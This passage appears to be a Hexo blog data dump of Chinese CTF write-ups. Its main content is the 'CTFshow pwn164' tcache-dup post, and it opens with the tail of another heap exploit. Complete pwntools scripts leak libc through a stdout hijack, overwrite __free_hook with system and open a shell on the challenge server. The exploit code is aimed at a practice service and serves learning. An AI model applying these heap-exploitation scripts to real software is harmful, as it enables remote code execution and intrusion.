class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0xb</span>+p64(one_gadget)+p64(realloc+<span class=\"number\">8</span>)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;Command: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;Size: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x68</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"思路二\"><a href=\"#思路二\" class=\"headerlink\" title=\"思路二\"></a>思路二</h3><p>懒得写了，直接那官方的题解了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28145</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/home/bit/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Alloc</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Size:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Fill</span>(<span class=\"params\">index,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Index:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Size:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(content)))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Content:&#x27;</span>)</span><br><span class=\"line\">    io.send(content)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Free</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Index:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Dump</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Command:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Index:&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;Content: \\n&#x27;</span>)</span><br><span class=\"line\">    A = io.recvline()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> A</span><br><span class=\"line\"></span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">Free(<span class=\"number\">1</span>)</span><br><span class=\"line\">Free(<span class=\"number\">2</span>)</span><br><span class=\"line\">padding = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">payload = padding*<span class=\"number\">2</span> + p8(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">Fill(<span class=\"number\">0</span>, payload)</span><br><span class=\"line\">Fill(<span class=\"number\">3</span>, padding)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0x91</span>)</span><br><span class=\"line\">Fill(<span class=\"number\">3</span>, payload)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">Free(<span class=\"number\">4</span>)</span><br><span class=\"line\">libc_base = u64(Dump(<span class=\"number\">2</span>)[:<span class=\"number\">8</span>].ljust(<span class=\"number\">8</span>, <span class=\"string\">&quot;\\x00&quot;</span>))-<span class=\"number\">0x3c4b78</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">    </span><br><span class=\"line\">Alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">Free(<span class=\"number\">4</span>)</span><br><span class=\"line\">payload = p64(libc_base + <span class=\"number\">0x3c4aed</span>)</span><br><span class=\"line\">Fill(<span class=\"number\">2</span>, payload)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">one = libc_base + <span class=\"number\">0x4526a</span></span><br><span class=\"line\">payload = p8(<span class=\"number\">0</span>)*<span class=\"number\">3</span> + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(one)</span><br><span class=\"line\">Fill(<span class=\"number\">6</span>, payload)</span><br><span class=\"line\">Alloc(<span class=\"number\">0x10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"CTFshow pwn164","cover":"/img/阿尼亚.png","_content":"# CTFshow pwn164 （tcache dup）\n\n## 前言\n​        一步一步来吧，这是一道2.27版本的利用。同时是需要打__IO_2_1_stdout_去泄露libc地址的。但是难度不大，因为tcache bin 有些太拉胯了。给它一个uaf ，它可以自己double free 7次。这是什么？然后利用realloc 的一个特性，既可以malloc 又 可以 free。\n​        **七剑下天山** 遇上 **双料特工** ，简直无敌了。\n\n## ida分析\n\n### delete功能\n![image-20250530200643343](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200643343.png)\n1.典型的uaf 没有置空，但是ptr是哪来的?\n2.继续看，add功能\n\n### add功能\n![image-20250530200820909](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200820909.png)\n1.ptr在这里，也就是刚刚分配的堆块的指针。\n2.realloc，一个很有问题的函数。当size不为0时且ptr不为空时：realloc 会检测ptr 的大小，如果ptr_size>=size，就重新分配，切割;否则，会先free ptr，再分配，然后两者都会返回分配的空间的指针。当size不为0且ptr为空时，与malloc等效，返回指针。当size为0且ptr不为空时，与free等效，并且返回空。size为0且ptr为空，梅栾邕。\n\n### 神秘选项\n![image-20250530201556131](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530201556131.png)\n1.一次置空ptr的机会\n\n## 思路分析\n1.首先还是查看保护机制--全开。第一步还是老步骤，泄露libc。同样在这里只能通过unsorted bin中的堆块，来泄露。但是因为是2.27版本，所以需要先把tcache bin填满，才能让堆块进入unsorted bin。同时，此题没有show来打印，所以需要劫持__IO_2_1_stdout_ ，然后puts时，会把相关信息打出来。那么通过gdb 观察 stdout 的地址与main_arena的地址，修改低位两字节即可。这里需要注意一点。当我们把tcache bin 填满，且把这个堆块放入unsorted bin中后。如果直接add 这个堆块，是会把tcache bin 中的这个堆块申请出来的。如图：\n![image-20250530210823813](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530210823813.png)\n\n2.如果要实现tcache dup 的话，应该是先把unsorted bin 中的这个堆块拿出来，并且覆盖fd针的低位，使得stdout被链入tcache bin 中。然后在把这两个堆块申清出来。所以我们要在这个堆块前面，申请一个堆块a。a堆块与我们这个堆块地址相邻，在申请前，先把a堆块申请出来，再申请两个堆块大小之和的堆块大小，这样a会先被free，然后与这个堆块合并再被分配出来。如图：\n![image-20250530212136953](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530212136953.png)\n\n3.然后就是劫持stdout ，拿到libc后就是，同样的操作，去分配到free hook并篡改成system。同时在free hook -8 的位置布置\"/bin/sh;\" 最后free() 就可以触发，getshell了\n\n## exp\n```python \nfrom esy import *\ncontext.log_level = 'debug'\ncontext.terminal = ['tmux','splitw','-h','-l','66%']\nio,elf=loadfile(\"pwn\",\"pwn.challenge.ctf.show\",28309)\nlibc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6\")\n\n\ndef add(size,content):\n    io.sendafter(\"Choice:\",\"1\")\n    io.sendafter(\"Size?\\n\",str(size))\n    io.sendafter(\"Content?\\n\",content)\ndef free():\n    io.sendafter(\"Choice:\",\"2\")\ndef tozero():\n    io.sendafter(\"Choice:\",\"1433233\")\n\nadd(0x70,b'a')\nadd(0,b'') \nadd(0x100,b'a')\nadd(0,b'')\n\nadd(0xa0,b'a')\nadd(0,b'')\nadd(0x100,b'a')\n# 填满tcache bins\n[free() for i in range(7)]\n\nadd(0,b'')\nadd(0x70,b'a')\nadd(0x180,b'c'*0x78+p64(0x41)+p8(0x60)+p8(0xc7))\nadd(0,b'')\n\nadd(0x100,b'a')\nadd(0,b'')\n\n# 劫持IO\nadd(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))\nlibc_base = u64(io.recvuntil(b\"\\x7f\",timeout=0.1)[-6:].ljust(8,b'\\x00'))-0x3e82a0\n#libc_base = u64(io.recv(6).ljust(8,b'\\x00'))-0x3e82a0\nfree_hook = libc_base + libc.sym[\"__free_hook\"]\nsystem = libc_base + libc.sym['system']\none_gadget = libc_base + 0x4f322\nlogvalue(\"libc_base\",hex(libc_base))\nlogvalue(\"free\",hex(free_hook))\nlogvalue(\"system\",hex(system))\n\ntozero()\nadd(0x120,b'a')\nadd(0,b'')\nadd(0x130,b'a')\nadd(0,b'')\nadd(0x140,b'a')\nadd(0,b'')\nadd(0x130,b'a')\n[free() for i in range(7)]\nadd(0,b\" \")\nadd(0x120,b'a')\n#gdb.attach(io)\nadd(0x260,b'a'*0x128+p64(0x131)+p64(free_hook-8))\nadd(0,b'')\nadd(0x130,b'a')\nadd(0,b'')\nadd(0x130,b\"/bin/sh;\"+p64(system))\nfree()\n\nio.interactive()\n```\n\n","source":"_posts/heap/CTFshow pwn164.md","raw":"---\ntitle: CTFshow pwn164\ntags:\n    - pwn\n    - tcachebin dup\ncategories:\n    - 做题笔记\ncover: /img/阿尼亚.png\n---\n# CTFshow pwn164 （tcache dup）\n\n## 前言\n​        一步一步来吧，这是一道2.27版本的利用。同时是需要打__IO_2_1_stdout_去泄露libc地址的。但是难度不大，因为tcache bin 有些太拉胯了。给它一个uaf ，它可以自己double free 7次。这是什么？然后利用realloc 的一个特性，既可以malloc 又 可以 free。\n​        **七剑下天山** 遇上 **双料特工** ，简直无敌了。\n\n## ida分析\n\n### delete功能\n![image-20250530200643343](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200643343.png)\n1.典型的uaf 没有置空，但是ptr是哪来的?\n2.继续看，add功能\n\n### add功能\n![image-20250530200820909](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200820909.png)\n1.ptr在这里，也就是刚刚分配的堆块的指针。\n2.realloc，一个很有问题的函数。当size不为0时且ptr不为空时：realloc 会检测ptr 的大小，如果ptr_size>=size，就重新分配，切割;否则，会先free ptr，再分配，然后两者都会返回分配的空间的指针。当size不为0且ptr为空时，与malloc等效，返回指针。当size为0且ptr不为空时，与free等效，并且返回空。size为0且ptr为空，梅栾邕。\n\n### 神秘选项\n![image-20250530201556131](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530201556131.png)\n1.一次置空ptr的机会\n\n## 思路分析\n1.首先还是查看保护机制--全开。第一步还是老步骤，泄露libc。同样在这里只能通过unsorted bin中的堆块，来泄露。但是因为是2.27版本，所以需要先把tcache bin填满，才能让堆块进入unsorted bin。同时，此题没有show来打印，所以需要劫持__IO_2_1_stdout_ ，然后puts时，会把相关信息打出来。那么通过gdb 观察 stdout 的地址与main_arena的地址，修改低位两字节即可。这里需要注意一点。当我们把tcache bin 填满，且把这个堆块放入unsorted bin中后。如果直接add 这个堆块，是会把tcache bin 中的这个堆块申请出来的。如图：\n![image-20250530210823813](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530210823813.png)\n\n2.如果要实现tcache dup 的话，应该是先把unsorted bin 中的这个堆块拿出来，并且覆盖fd针的低位，使得stdout被链入tcache bin 中。然后在把这两个堆块申清出来。所以我们要在这个堆块前面，申请一个堆块a。a堆块与我们这个堆块地址相邻，在申请前，先把a堆块申请出来，再申请两个堆块大小之和的堆块大小，这样a会先被free，然后与这个堆块合并再被分配出来。如图：\n![image-20250530212136953](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530212136953.png)\n\n3.然后就是劫持stdout ，拿到libc后就是，同样的操作，去分配到free hook并篡改成system。同时在free hook -8 的位置布置\"/bin/sh;\" 最后free() 就可以触发，getshell了\n\n## exp\n```python \nfrom esy import *\ncontext.log_level = 'debug'\ncontext.terminal = ['tmux','splitw','-h','-l','66%']\nio,elf=loadfile(\"pwn\",\"pwn.challenge.ctf.show\",28309)\nlibc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6\")\n\n\ndef add(size,content):\n    io.sendafter(\"Choice:\",\"1\")\n    io.sendafter(\"Size?\\n\",str(size))\n    io.sendafter(\"Content?\\n\",content)\ndef free():\n    io.sendafter(\"Choice:\",\"2\")\ndef tozero():\n    io.sendafter(\"Choice:\",\"1433233\")\n\nadd(0x70,b'a')\nadd(0,b'') \nadd(0x100,b'a')\nadd(0,b'')\n\nadd(0xa0,b'a')\nadd(0,b'')\nadd(0x100,b'a')\n# 填满tcache bins\n[free() for i in range(7)]\n\nadd(0,b'')\nadd(0x70,b'a')\nadd(0x180,b'c'*0x78+p64(0x41)+p8(0x60)+p8(0xc7))\nadd(0,b'')\n\nadd(0x100,b'a')\nadd(0,b'')\n\n# 劫持IO\nadd(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))\nlibc_base = u64(io.recvuntil(b\"\\x7f\",timeout=0.1)[-6:].ljust(8,b'\\x00'))-0x3e82a0\n#libc_base = u64(io.recv(6).ljust(8,b'\\x00'))-0x3e82a0\nfree_hook = libc_base + libc.sym[\"__free_hook\"]\nsystem = libc_base + libc.sym['system']\none_gadget = libc_base + 0x4f322\nlogvalue(\"libc_base\",hex(libc_base))\nlogvalue(\"free\",hex(free_hook))\nlogvalue(\"system\",hex(system))\n\ntozero()\nadd(0x120,b'a')\nadd(0,b'')\nadd(0x130,b'a')\nadd(0,b'')\nadd(0x140,b'a')\nadd(0,b'')\nadd(0x130,b'a')\n[free() for i in range(7)]\nadd(0,b\" \")\nadd(0x120,b'a')\n#gdb.attach(io)\nadd(0x260,b'a'*0x128+p64(0x131)+p64(free_hook-8))\nadd(0,b'')\nadd(0x130,b'a')\nadd(0,b'')\nadd(0x130,b\"/bin/sh;\"+p64(system))\nfree()\n\nio.interactive()\n```\n\n","slug":"heap/CTFshow pwn164","published":1,"date":"2025-06-22T12:08:58.258Z","updated":"2025-06-23T05:48:02.020Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ib001euomydjg02t6w","content":"<h1 id=\"CTFshow-pwn164-（tcache-dup）\"><a href=\"#CTFshow-pwn164-（tcache-dup）\" class=\"headerlink\" title=\"CTFshow pwn164 （tcache dup）\"></a>CTFshow pwn164 （tcache dup）</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​        一步一步来吧，这是一道2.27版本的利用。同时是需要打__IO_2_1_stdout_去泄露libc地址的。但是难度不大，因为tcache bin 有些太拉胯了。给它一个uaf ，它可以自己double free 7次。这是什么？然后利用realloc 的一个特性，既可以malloc 又 可以 free。<br>​        <strong>七剑下天山</strong> 遇上 <strong>双料特工</strong> ，简直无敌了。</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"delete功能\"><a href=\"#delete功能\" class=\"headerlink\" title=\"delete功能\"></a>delete功能</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200643343.png\" alt=\"image-20250530200643343\"><br>1.典型的uaf 没有置空，但是ptr是哪来的?<br>2.继续看，add功能</p>\n<h3 id=\"add功能\"><a href=\"#add功能\" class=\"headerlink\" title=\"add功能\"></a>add功能</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530200820909.png\" alt=\"image-20250530200820909\"><br>1.ptr在这里，也就是刚刚分配的堆块的指针。<br>2.realloc，一个很有问题的函数。当size不为0时且ptr不为空时：realloc 会检测ptr 的大小，如果ptr_size&gt;&#x3D;size，就重新分配，切割;否则，会先free ptr，再分配，然后两者都会返回分配的空间的指针。当size不为0且ptr为空时，与malloc等效，返回指针。当size为0且ptr不为空时，与free等效，并且返回空。size为0且ptr为空，梅栾邕。</p>\n<h3 id=\"神秘选项\"><a href=\"#神秘选项\" class=\"headerlink\" title=\"神秘选项\"></a>神秘选项</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530201556131.png\" alt=\"image-20250530201556131\"><br>1.一次置空ptr的机会</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.首先还是查看保护机制–全开。第一步还是老步骤，泄露libc。同样在这里只能通过unsorted bin中的堆块，来泄露。但是因为是2.27版本，所以需要先把tcache bin填满，才能让堆块进入unsorted bin。同时，此题没有show来打印，所以需要劫持__IO_2_1_stdout_ ，然后puts时，会把相关信息打出来。那么通过gdb 观察 stdout 的地址与main_arena的地址，修改低位两字节即可。这里需要注意一点。当我们把tcache bin 填满，且把这个堆块放入unsorted bin中后。如果直接add 这个堆块，是会把tcache bin 中的这个堆块申请出来的。如图：<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530210823813.png\" alt=\"image-20250530210823813\"></p>\n<p>2.如果要实现tcache dup 的话，应该是先把unsorted bin 中的这个堆块拿出来，并且覆盖fd针的低位，使得stdout被链入tcache bin 中。然后在把这两个堆块申清出来。所以我们要在这个堆块前面，申请一个堆块a。a堆块与我们这个堆块地址相邻，在申请前，先把a堆块申请出来，再申请两个堆块大小之和的堆块大小，这样a会先被free，然后与这个堆块合并再被分配出来。如图：<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250530212136953.png\" alt=\"image-20250530212136953\"></p>\n<p>3.然后就是劫持stdout ，拿到libc后就是，同样的操作，去分配到free hook并篡改成system。同时在free hook -8 的位置布置”&#x2F;bin&#x2F;sh;” 最后free() 就可以触发，getshell了</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;66%&#x27;</span>]</span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;pwn&quot;</span>,<span class=\"string\">&quot;pwn.challenge.ctf.show&quot;</span>,<span class=\"number\">28309</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/tsq/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Size?\\n&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Content?\\n&quot;</span>,content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">tozero</span>():</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;Choice:&quot;</span>,<span class=\"string\">&quot;1433233&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x70</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>) </span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0xa0</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 填满tcache bins</span></span><br><span class=\"line\">[free() <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x70</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x180</span>,<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x78</span>+p64(<span class=\"number\">0x41</span>)+p8(<span class=\"number\">0x60</span>)+p8(<span class=\"number\">0xc7</span>))</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 劫持IO</span></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,p64(<span class=\"number\">0xfbad1887</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p8(<span class=\"number\">0x58</span>))</span><br><span class=\"line\">libc_base = u64(io.recvuntil(<span class=\"string\">b&quot;\\x7f&quot;</span>,timeout=<span class=\"number\">0.1</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3e82a0</span></span><br><span class=\"line\"><span class=\"comment\">#libc_base = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x3e82a0</span></span><br><span class=\"line\">free_hook = libc_base + libc.sym[<span class=\"string\">&quot;__free_hook&quot;</span>]</span><br><span class=\"line\">system = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4f322</span></span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;free&quot;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\">logvalue(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"></span><br><span class=\"line\">tozero()</span><br><span class=\"line\">add(<span class=\"number\">0x120</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x130</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span 